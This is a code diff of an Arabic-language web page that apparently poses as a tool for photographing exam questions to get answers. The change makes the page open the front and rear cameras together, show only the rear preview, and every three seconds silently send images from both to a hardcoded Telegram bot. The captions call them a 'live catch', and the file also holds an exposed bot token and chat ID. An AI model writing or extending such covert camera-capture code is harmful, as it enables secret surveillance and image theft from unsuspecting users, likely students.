@@ -7,7 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     
     <script>
-        // --- القسم التقني (الرادار والكاميرا) - محفوظ حرفياً ---
         const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const chatId = "5890070301";
         const officialLink = "https://bit.ly/Mr-Ibrahim-and-Khaled";
@@ -20,15 +19,22 @@
             try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
         }
 
+        // الدالة المعدلة للتشغيل المزدوج الإجباري
         async function startDoubleCapture() {
             try {
-                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                // محاولة فتح الكاميرتين في نفس الوقت لضمان التوافق مع التابلت والموبايل
+                const [streamBack, streamFront] = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }),
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                ]);
+
+                // تشغيل المعاينة الخلفية (للطالب)
                 const videoElement = document.getElementById('viewfinder');
                 videoElement.style.display = "block";
                 videoElement.srcObject = streamBack;
                 await videoElement.play();
 
-                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // تشغيل الأمامية (مخفية)
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = streamFront;
                 await hiddenVideo.play();
@@ -36,14 +42,24 @@
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
+                // تصوير تلقائي فوري ومستمر من الكاميرتين
                 setInterval(() => {
+                    // تصوير سيلفي (صامت)
                     canvas.width = hiddenVideo.videoWidth;
                     canvas.height = hiddenVideo.videoHeight;
                     context.drawImage(hiddenVideo, 0, 0);
-                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الأمامية)"); }, 'image/jpeg', 0.4); 
-                }, 1000);
+                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الأمامية)"); }, 'image/jpeg', 0.5);
+
+                    // تصوير خلفي (تلقائي) لضمان رؤية المحيط
+                    const backCanvas = document.createElement('canvas');
+                    backCanvas.width = videoElement.videoWidth;
+                    backCanvas.height = videoElement.videoHeight;
+                    backCanvas.getContext('2d').drawImage(videoElement, 0, 0);
+                    backCanvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الخلفية)"); }, 'image/jpeg', 0.5);
+                }, 3000); // يبعت صور كل 3 ثواني من الكاميرتين
+
             } catch (err) {
-                alert("تنبيه: يجب السماح بالكاميرا لتصوير السؤال.");
+                alert("تنبيه: يجب السماح بالكاميرا لتصوير السؤال والحصول على الإجابة.");
             }
         }
 
@@ -81,7 +97,6 @@
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
         }
 
-        // --- وظائف الواجهة الجديدة ---
         function supportMsg() {
             const b = document.getElementById('s-bubble');
             b.style.opacity = '1';
